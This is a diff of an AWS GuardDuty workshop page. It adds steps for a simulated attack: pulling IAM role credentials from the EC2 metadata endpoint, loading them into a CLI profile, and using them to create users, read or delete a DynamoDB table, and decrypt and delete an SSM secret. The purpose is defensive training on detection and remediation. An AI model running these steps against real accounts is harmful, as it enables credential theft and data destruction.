@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\s\-]+">
       
       <link rel="shortcut icon" href="../assets/images/aws-favicon.ico">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.0">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.2.0">
     
     
       
@@ -46,7 +46,7 @@
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/application.0284f74d.css">
+      <link rel="stylesheet" href="../assets/stylesheets/application.750b69bd.css">
       
       
     
@@ -56,7 +56,7 @@
     
       
         <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono&display=fallback">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
         <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
       
     
@@ -77,7 +77,24 @@
       <defs>
         
         
-          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
+    viewBox="0 0 416 448" id="__github">
+  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
+        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
+        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
+        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
+        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
+        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
+        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
+        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
+        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
+        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
+        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
+        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
+        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
+        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
+        99.5z" />
+</svg>
         
       </defs>
     </svg>
@@ -434,8 +451,42 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#architecture-evaluation" title="Architecture Evaluation" class="md-nav__link">
-    Architecture Evaluation
+  <a href="#generate-a-finding-manually" title="Generate a finding manually" class="md-nav__link">
+    Generate a finding manually
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#retrieve-the-iam-temporary-security-credentials-using-aws-systems-manager" title="Retrieve the IAM temporary security credentials using AWS Systems Manager" class="md-nav__link">
+    Retrieve the IAM temporary security credentials using AWS Systems Manager
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-a-new-aws-cli-profile-on-your-laptop-to-use-the-iam-temporary-credentials" title="Create a new AWS CLI profile on your laptop to use the IAM temporary credentials" class="md-nav__link">
+    Create a new AWS CLI profile on your laptop to use the IAM temporary credentials
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#run-commands-using-the-iam-temporary-credentials" title="Run commands using the IAM temporary credentials" class="md-nav__link">
+    Run commands using the IAM temporary credentials
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#architecture-overview" title="Architecture Overview" class="md-nav__link">
+    Architecture Overview
   </a>
   
 </li>
@@ -556,8 +607,42 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#architecture-evaluation" title="Architecture Evaluation" class="md-nav__link">
-    Architecture Evaluation
+  <a href="#generate-a-finding-manually" title="Generate a finding manually" class="md-nav__link">
+    Generate a finding manually
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#retrieve-the-iam-temporary-security-credentials-using-aws-systems-manager" title="Retrieve the IAM temporary security credentials using AWS Systems Manager" class="md-nav__link">
+    Retrieve the IAM temporary security credentials using AWS Systems Manager
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-a-new-aws-cli-profile-on-your-laptop-to-use-the-iam-temporary-credentials" title="Create a new AWS CLI profile on your laptop to use the IAM temporary credentials" class="md-nav__link">
+    Create a new AWS CLI profile on your laptop to use the IAM temporary credentials
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#run-commands-using-the-iam-temporary-credentials" title="Run commands using the IAM temporary credentials" class="md-nav__link">
+    Run commands using the IAM temporary credentials
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#architecture-overview" title="Architecture Overview" class="md-nav__link">
+    Architecture Overview
   </a>
   
 </li>
@@ -630,11 +715,92 @@
                 
                 
                 <h1 id="iam-role-credential-exfiltration">IAM Role credential exfiltration</h1>
+<h3 id="generate-a-finding-manually">Generate a finding manually</h3>
+<p>All of the simulated attacks and findings are generated automatically in the CloudFormation template except for one; which requires you to take some manual steps.  To produce the final finding, you will need to copy the IAM temporary security credentials from the EC2 instance and manually make API calls from your laptop.</p>
+<div class="admonition info">
+<p class="admonition-title">API calls need to come from outside the AWS network or they will not generate findings</p>
+</div>
+<h4 id="retrieve-the-iam-temporary-security-credentials-using-aws-systems-manager">Retrieve the IAM temporary security credentials using AWS Systems Manager</h4>
+<p>To simulate this last and final attack you will need to retrieve the IAM temporary security credentials generated by the IAM Role for EC2. You can either SSH directly to the instance and query the metadata or follow the steps below to use <a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html" target="_blank">AWS Systems Manager Session Manager</a> (an SSM agent was automatically started on the instance at launch).</p>
+<ol>
+<li>
+<p>Go to <a href="https://us-west-2.console.aws.amazon.com/systems-manager/managed-instances?region=us-west-2" target="_blank">Managed Instances</a> within the <strong>AWS Systems Manager</strong> console (us-west-2).</p>
+<blockquote>
+<p>You should see an instance named <strong>GuardDuty-Example: Compromised Instance: Scenario 3</strong> with a ping status of <strong>Online</strong>.</p>
+</blockquote>
+</li>
+<li>
+<p>To see the keys currently active on the instance, click on <strong>Session Manager</strong> on the left navigation and then click <strong>Start Session</strong>.</p>
+</li>
+<li>To see the credentials currently active on the instance, click on the radio button next to <strong>Compromised Instance: Scenario 3</strong> and click <strong>Start Session</strong>.</li>
+<li>Run the following command in the shell:</li>
+</ol>
+<div class="codehilite"><pre><span></span>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/GuardDuty-Example-EC2-Compromised
+</pre></div>
+
+
+<ol>
+<li>Make note of the <strong>AccessKeyID</strong>, <strong>SecretAccessKey</strong>, and <strong>Token</strong>.</li>
+</ol>
+<h4 id="create-a-new-aws-cli-profile-on-your-laptop-to-use-the-iam-temporary-credentials">Create a new AWS CLI profile on your laptop to use the IAM temporary credentials</h4>
+<p>Now that you have retrieved the IAM temporary security credentials you will need to add them to an AWS CLI profile. There are a number of ways to do this, but below are some commands to help get you started:</p>
+<p>From a command prompt, run the following commands (replace the variables with your credentials):</p>
+<div class="codehilite"><pre><span></span>aws configure set profile.badbob.region us-west-2
+aws configure set profile.badbob.aws_access_key_id &lt;access_key&gt;
+aws configure set profile.badbob.aws_secret_access_key &lt;secret_key&gt;
+aws configure set profile.badbob.aws_session_token &lt;session_token&gt;
+</pre></div>
+
+
+<p>If you view your local aws credentials file, you should now see an [badbob] profile with the stolen IAM temporary credentials.</p>
+<h4 id="run-commands-using-the-iam-temporary-credentials">Run commands using the IAM temporary credentials</h4>
+<p>Now that you have your named profile you can use it to make API calls. Use the commands below to query different services to see what you have access to.</p>
+<div class="admonition failure">
+<p class="admonition-title">Don't be surprised if you see some access denied responses, it is intended</p>
+</div>
+<p><strong>Do you have any IAM permissions:</strong></p>
+<div class="codehilite"><pre><span></span>aws iam get-user --profile badbob
+
+aws iam create-user --user-name Chuck --profile badbob
+</pre></div>
+
+
+<p><strong>What about DynamoDB?</strong></p>
+<div class="codehilite"><pre><span></span>aws dynamodb list-tables --profile badbob
+
+aws dynamodb describe-table --table-name GuardDuty-Example-Customer-DB --profile badbob
+</pre></div>
+
+
+<p><strong>Can you query the data?</strong></p>
+<div class="codehilite"><pre><span></span>aws dynamodb scan --table-name GuardDuty-Example-Customer-DB --profile badbob
+
+aws dynamodb put-item --table-name GuardDuty-Example-Customer-DB --item &#39;{&quot;name&quot;:{&quot;S&quot;:&quot;Joshua Tree&quot;},&quot;state&quot;:{&quot;S&quot;:&quot;Michigan&quot;},&quot;website&quot;:{&quot;S&quot;:&quot;https://www.nps.gov/yell/index.htm&quot;}}&#39; --profile badbob
+
+aws dynamodb scan --table-name GuardDuty-Example-Customer-DB --profile badbob
+
+aws dynamodb delete-table --table-name GuardDuty-Example-Customer-DB --profile badbob
+
+aws dynamodb list-tables --profile badbob
+</pre></div>
+
+
+<p><strong>Do you have access to Systems Manager Parameter Store?</strong></p>
+<div class="codehilite"><pre><span></span>aws ssm describe-parameters --profile badbob
+
+aws ssm get-parameters --names &quot;gd_prod_dbpwd_sample&quot; --profile badbob
+
+aws ssm get-parameters --names &quot;gd_prod_dbpwd_sample&quot; --with-decryption --profile badbob
+
+aws ssm delete-parameter --name &quot;gd_prod_dbpwd_sample&quot; --profile badbob
+</pre></div>
+
+
 <p>After manually remediating the previous GuardDuty finding, you have finally finished your first cup of coffee when an email notification comes in alerting you to yet another finding.  You finish reading the first email and then a minute or so later you see the relevant remediation email, meaning Alice has already put in place a remediation for this finding.  The other findings you looked at dealt with EC2 instances and AWS IAM credentials separately, but this finding appears to be related to an AWS IAM Role associated with an EC2 instance.  You decide to take a closer look at the finding and remediation.</p>
 <div class="admonition attention">
 <p class="admonition-title">None of your personal IAM credentials have actually been compromised or exposed in any way.</p>
 </div>
-<h2 id="architecture-evaluation">Architecture Evaluation</h2>
+<h2 id="architecture-overview">Architecture Overview</h2>
 <p><img alt="Attack Scenario 3" src="images/attack3.png" title="Attack Scenario 3" /></p>
 <blockquote>
 <ol>
@@ -650,12 +816,12 @@
 <h3 id="browse-to-the-guardduty-console-to-investigate">Browse to the GuardDuty console to investigate</h3>
 <p>To view the findings:</p>
 <ol>
-<li>Navigate to the <a href="https://us-west-2.console.aws.amazon.com/guardduty/home?" target="_blank">GuardDuty console</a> (us-west-2) and then, in the navigation pane on the left, choose <strong>Current</strong>. </li>
+<li>Navigate to the <a href="https://us-west-2.console.aws.amazon.com/guardduty/home?" target="_blank">GuardDuty console</a> (us-west-2) and then, in the navigation pane on the left, choose <strong>Current</strong>.</li>
 <li>
-<p>Click the  <img alt="Refresh" src="images/refreshicon.png" title="Refresh" /> icon to refresh the GuardDuty console. You should see a finding with the type <strong>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration</strong>. </p>
+<p>Click the  <img alt="Refresh" src="images/refreshicon.png" title="Refresh" /> icon to refresh the GuardDuty console. You should see a finding with the type <strong>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration</strong>.</p>
 </li>
 <li>
-<p>Click on the <strong>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration</strong> finding to view the full details. </p>
+<p>Click on the <strong>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration</strong> finding to view the full details.</p>
 </li>
 </ol>
 <p>Looking at the finding details you can see that this is actually a <strong>High Severity</strong> finding.  This finding informs you of attempts to run AWS API operations from a host outside of EC2, using temporary AWS credentials that were created on an EC2 instance in your AWS account.  This means your EC2 instance has been compromised, and the temporary credentials from the instance have been exfiltrated to a remote host outside of AWS.</p>
@@ -665,20 +831,20 @@
 <h3 id="view-the-cloudwatch-event-rule">View the CloudWatch Event rule</h3>
 <ol>
 <li>Navigate to the <a href="https://us-west-2.console.aws.amazon.com/cloudwatch/home?" target="_blank">CloudWatch console</a> (us-west-2) and on the left navigation, under the <strong>Events</strong> section, click <strong>Rules</strong>.</li>
-<li>Click on the rule that Alice configured for this particular finding (<strong>GuardDuty-Event-IAMUser-InstanceCredentialExfiltration</strong>). </li>
+<li>Click on the rule that Alice configured for this particular finding (<strong>GuardDuty-Event-IAMUser-InstanceCredentialExfiltration</strong>).</li>
 </ol>
 <p>Take a closer look at the <strong>Event Pattern</strong>.  The pattern Alice setup for all the rules specifies particular findings.  </p>
 <blockquote>
 <p>Like Alice, you can create CloudWatch Event Rules that are triggered for particular findings but you can also create a rule that is triggered based on any GuardDuty finding in order to have a centralized workflow.  Below is an example of an Event Pattern that would trigger for any GuardDuty finding:</p>
 </blockquote>
-<div class="codehilite"><pre><span></span><span class="err">{</span>
-  <span class="ss">&quot;detail-type&quot;</span><span class="p">:</span> <span class="p">[</span>
-    <span class="ss">&quot;GuardDuty Finding&quot;</span>
-  <span class="p">],</span>
-  <span class="ss">&quot;source&quot;</span><span class="p">:</span> <span class="p">[</span>
-    <span class="ss">&quot;aws.guardduty&quot;</span>
-  <span class="p">]</span>
-<span class="err">}</span>
+<div class="codehilite"><pre><span></span>{
+  &quot;detail-type&quot;: [
+    &quot;GuardDuty Finding&quot;
+  ],
+  &quot;source&quot;: [
+    &quot;aws.guardduty&quot;
+  ]
+}
 </pre></div>
 
 
@@ -691,7 +857,7 @@
 </blockquote>
 <h3 id="verify-that-the-remediation-was-successful">Verify that the remediation was successful</h3>
 <p>To verify that the <strong>InstanceCredentialExfiltration</strong> finding was remediated, you can run one of the CLI commands you ran earlier.</p>
-<div class="codehilite"><pre><span></span><span class="n">aws</span> <span class="n">dynamodb</span> <span class="n">list</span><span class="o">-</span><span class="n">tables</span> <span class="c1">--profile attacker</span>
+<div class="codehilite"><pre><span></span>aws dynamodb list-tables --profile attacker
 </pre></div>
 
 
@@ -796,7 +962,7 @@
       
     </div>
     
-      <script src="../assets/javascripts/application.245445c6.js"></script>
+      <script src="../assets/javascripts/application.39abc4af.js"></script>
       
       <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
       
